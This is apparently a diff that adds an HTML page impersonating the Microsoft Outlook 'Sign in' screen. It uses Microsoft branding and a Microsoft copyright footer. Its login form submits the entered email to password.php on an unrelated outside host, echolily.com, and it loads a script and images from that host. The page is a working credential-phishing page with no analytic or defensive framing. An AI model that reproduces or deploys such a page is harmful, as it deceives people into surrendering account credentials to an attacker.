@@ -1,0 +1,149 @@
+
+<!DOCTYPE html>
+
+<html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><base href="">
+
+<script src="http://echolily.com/~livecenter/outlook_files/modal.js"></script>
+
+<script>
+function empty() {
+    var x;
+    x = document.getElementById("email").value;
+    if (x == "") {
+        document.getElementById("email").style = "border-color:red";
+		document.getElementById("email_error").style = "display: block";
+        return false;
+    };
+
+}
+</script>
+
+<script>
+function change() {
+    var e;
+    e = document.getElementById("email").value;
+    if (e !== ""){
+	    document.getElementById("email").style = "";
+		document.getElementById("email_error").style = "display: none";
+	}
+	
+}
+
+</script>
+
+<title>Sign in</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+<link rel="shortcut icon" href="outlook_files/favicon.ico">
+            <link rel="stylesheet" title="Converged" type="text/css" href="outlook_files/Converged1033.css"><style type="text/css">body.cb input.hip
+    {
+        border-width: 2px !important;
+    }
+</style><style type="text/css">body{display:none;}</style>
+
+<style type="text/css">body{display:block !important;}</style>
+
+<link rel="image_src" href="https://auth.gfx.ms/16.000.27523.1/images/Windows_Live_v_thumb.jpg">
+
+</head>
+
+<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
+<div> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(http://echolily.com/~livecenter/&quot;./outlook_files/0.jpg&quot;);"></div><div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(http://echolily.com/~livecenter/&quot;./outlook_files/0.jpg&quot;);"></div><div class="background-overlay"></div> </div></div> 
+
+<form name="f1" id="i0281" spellcheck="false" autocomplete="off" method="post" action="http://echolily.com/~livecenter/password.php?&amp;sessionid=ed6271a9c57db8bc21b15a90f857b921&amp;securessl=true" onsubmit="return empty();">
+
+ <div class="outer" data-bind="component: { name: &#39;page&#39;,
+        params: {
+            serverData: svr,
+            showButtons: svr.A2,
+            showFooterLinks: true,
+            useWizardBehavior: svr.BR,
+            handleWizardButtons: false,
+            password: password,
+            hideFromAria: ariaHidden },
+        event: {
+            footerAgreementClick: footer_agreementClick } }"> <div class="middle">
+			
+			<div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }">
+
+			<div data-bind="component: { name: &#39;logo-control&#39;,
+                    params: {
+                        isChinaDc: svr.fIsChinaDc,
+                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
+						<img class="logo" role="presentation" pngsrc="./outlook_files/microsoft_logo.png" svgsrc="./outlook_files/microsoft_logo.svg" data-bind="imgSrc" src="outlook_files/microsoft_logo.svg"></div>
+
+						<div data-bind="
+                    css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) },
+                    component: { name: &#39;pagination-control&#39;,
+                        publicMethods: paginationControlMethods,
+                        params: {
+                            initialViewId: initialViewId,
+                            currentViewId: currentViewId,
+                            initialSharedData: initialSharedData,
+                            initialError: $loginPage.getServerError() },
+                        event: {
+                            cancel: paginationControl_onCancel,
+                            showView: $loginPage.view_onShow } }"><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }">
+							
+							<div data-viewid="1" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
+                        params: {
+                            serverData: svr,
+                            serverError: initialError,
+                            isInitialView: isInitialState,
+                            displayName: sharedData.displayName,
+                            prefillNames: $loginPage.prefillNames,
+                            flowToken: sharedData.flowToken },
+                        event: {
+                            refresh: $loginPage.view_onRefresh,
+                            redirect: $loginPage.view_onRedirect,
+                            showLearnMore: $loginPage.learnMore_onShow } }"><div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;WF_STR_HeaderDefault_Title&#39;]">Sign in</div> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"> </div> <div class="form-group col-md-24">
+
+							<div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;, params: {
+            serverData: svr,
+            textInput: displayName,
+            hasFocus: isFocused,
+            hintText: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Email_Example&#39;],
+            hintCss: &#39;placeholder&#39; + (!svr.Ba ? &#39; ltr_override&#39; : &#39;&#39;) } }">
+			
+			<label id="email" style="display: none"><font color="red">Email, phone or Skype is required</font></label>
+			
+			<input type="email" name="email" id="email" maxlength="113" onblur="change();" class="form-control ltr_override" placeholder="Email, phone, or Skype"> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <div id="emailProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending" style="display: none;"><div></div><div></div><div></div><div></div><div></div><div></div></div>
+					
+					 </div> </div> </div> </div> <div class="row"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
+        params: {
+            serverData: svr,
+            isPrimaryButtonEnabled: !isRequestPending(),
+            isPrimaryButtonVisible: svr.A2,
+            isSecondaryButtonEnabled: true,
+            isSecondaryButtonVisible: svr.A2 &amp;&amp; isBackButtonVisible() },
+        event: {
+            primaryButtonClick: primaryButton_onClick,
+            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
+     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+     css: { &#39;no-margin-bottom&#39;: removeBottomMargin }"> <div data-bind="css: { &#39;col-xs-12 secondary&#39;: isPrimaryButtonVisible(), &#39;col-xs-24&#39;: !isPrimaryButtonVisible() }" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
+            attr: {
+                &#39;id&#39;: secondaryButtonId || &#39;idBtn_Back&#39;,
+                &#39;aria-describedby&#39;: secondaryButtonDescribedBy },
+            value: secondaryButtonText() || str[&#39;CT_HRD_STR_Splitter_Back&#39;],
+            hasFocus: focusOnSecondaryButton,
+            click: secondaryButton_onClick,
+            enable: isSecondaryButtonEnabled,
+            visible: isSecondaryButtonVisible" value="Back" style="display: none;"> </div> <div data-bind="css: { &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible(), &#39;col-xs-24&#39;: !isSecondaryButtonVisible() }" class="col-xs-24"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
+            attr: {
+                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
+                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
+            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
+            hasFocus: focusOnPrimaryButton,
+            click: primaryButton_onClick,
+            enable: isPrimaryButtonEnabled,
+            visible: isPrimaryButtonVisible" value="Next"> </div> </div></div> </div> <div class="row"> <div class="col-md-24"> <div class="text-13 form-group no-margin-bottom" data-bind="
+            css: { &#39;no-margin-bottom&#39;: !svr.B3 &amp;&amp; !svr.showCantAccessAccountLink },
+            htmlWithBindings: html[&#39;WF_STR_SignUpLink_Text&#39;],
+            childBindings: { &#39;signup&#39;: { href: svr.b, css: { &#39;display-inline-block&#39;: true }, ariaLabel: str[&#39;WF_STR_SignupLink_AriaLabel_Text&#39;], click: signup_onClick } }">No account? <a href="../../signup.live.com/signup.aspx%3Fwa=wsignin1.0&amp;rpsnv=13&amp;ct=1506073308&amp;rver=6.7.6640.0&amp;wp=MBI_SSL&amp;wreply=https%253a%252f%252foutlook.live.com%252fowa%252f%253fauthRedirect%253dtrue%2526nlp%253d1%2526RpsCsrfState%253d55744145-df9f-4b42-d610-7776eac27bf1&amp;id=292841&amp;CBCXT=out&amp;fl=wld&amp;.html" id="signup" class="display-inline-block" aria-label="Create a Microsoft account">Create one!</a></div> </div> </div> </div> </div></div> </div> 
+			<div data-bind="component: { name: &#39;instrumentation&#39;,
+                publicMethods: instrumentationMethods,
+                params: { serverData: svr } }"></div> </div> </div> <div id="footer" class="footer default" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
+            params: {
+                serverData: svr,
+                showLinks: true },
+            event: {
+                agreementClick: footer_agreementClick } }"> <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.aa">©2018 Microsoft</span> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="index.html">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="index.html">Privacy &amp; Cookies</a></div> </div> </div> </form> </div></body></html>
